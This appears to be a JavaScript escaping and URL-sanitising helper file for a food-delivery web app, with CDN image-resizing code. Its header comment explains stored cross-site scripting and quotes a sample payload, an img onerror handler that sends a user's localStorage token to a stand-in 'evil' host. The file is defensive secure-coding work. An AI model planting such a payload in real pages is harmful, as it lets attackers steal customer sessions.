/* ================================================================
   EATSWADA — OUTPUT ESCAPING
   ----------------------------------------------------------------
   Every page in this app builds markup with template literals and
   assigns it through innerHTML. Any value that came back from the API
   is attacker-influenceable — a restaurant name, a dish name, a review
   comment, a saved address, a rider's name — and pasted in raw it stops
   being text and becomes script.

   A vendor who names a dish
     <img src=x onerror="fetch('https://evil/?t='+localStorage.token)">
   would otherwise steal the session of every customer who opens their
   restaurant page.

   RULES
     1. Wrap EVERY interpolated value in esc(). There is no field that
        is safe because it "should" be a name.
     2. Use safeUrl() for anything that lands in src="" or href="",
        then esc() the result.
     3. If the value is plain text with no markup around it, prefer
        el.textContent = value — nothing to escape at all.

   Load this BEFORE any page script that renders API data.
   ================================================================ */
(function () {
  'use strict';

  // Escapes quotes as well as angle brackets: roughly half the sinks in
  // this codebase are attribute values (alt="", title="", href="tel:..."),
  // where a bare " is enough to break out and add an event handler.
  function escapeHtml(value) {
    return String(value == null ? '' : value).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  // Returns '' unless the value is a real http(s) URL, so a stored
  // javascript: or data: URL can never reach src="" or href="".
  function safeUrl(value) {
    if (!value) return '';
    try {
      var u = new URL(String(value), location.href);
      return (u.protocol === 'https:' || u.protocol === 'http:') ? u.href : '';
    } catch (e) {
      return '';
    }
  }

  window.escapeHtml = escapeHtml;
  window.esc = escapeHtml;

  /*
   * Display-only image optimization.
   *
   * This never changes the image URL stored in API/cart data. It only
   * transforms known image CDNs at the <img src> boundary:
   * - Cloudinary: automatic format/quality + bounded width
   * - Unsplash: automatic format/quality + bounded width
   *
   * Unknown hosts are returned unchanged so existing image behaviour is
   * preserved.
   */
  function optimizedImageUrl(value, width) {
    var url = safeUrl(value);
    if (!url) return '';

    var target = Math.max(64, Math.min(1600, Number(width) || 320));

    try {
      var u = new URL(url, location.href);
      var host = u.hostname.toLowerCase();

      // Cloudinary image delivery: resize/compress only at render time.
      if ((host === 'res.cloudinary.com' || /(^|\.)cloudinary\.com$/i.test(host)) &&
          /\/image\/upload\//i.test(u.pathname)) {
        var parts = u.pathname.split('/image/upload/');
        var transformation = 'f_auto,q_auto,w_' + Math.round(target) + ',c_limit';
        var after = parts[1] || '';
        if (!/^(?:[^/]*,)?f_auto(?:,|\/|$)/i.test(after) &&
            !/^(?:[^/]*,)?q_auto(?:,|\/|$)/i.test(after)) {
          u.pathname = parts[0] + '/image/upload/' + transformation + '/' + after;
        } else if (!/(^|,)w_\d+(?:,|$)/i.test(after.split('/')[0] || '')) {
          u.pathname = parts[0] + '/image/upload/' + transformation + '/' + after;
        }
        return u.href;
      }

      // Unsplash image delivery already supports safe client-side sizing.
      if (host === 'images.unsplash.com') {
        u.searchParams.set('auto', 'format');
        u.searchParams.set('fit', 'crop');
        u.searchParams.set('w', String(Math.round(target)));
        u.searchParams.set('q', '80');
        return u.href;
      }
    } catch (e) {
      // Preserve the original safe URL on any unexpected URL parsing issue.
    }

    return url;
  }

  window.optimizedImageUrl = optimizedImageUrl;

  window.safeUrl = safeUrl;
})();
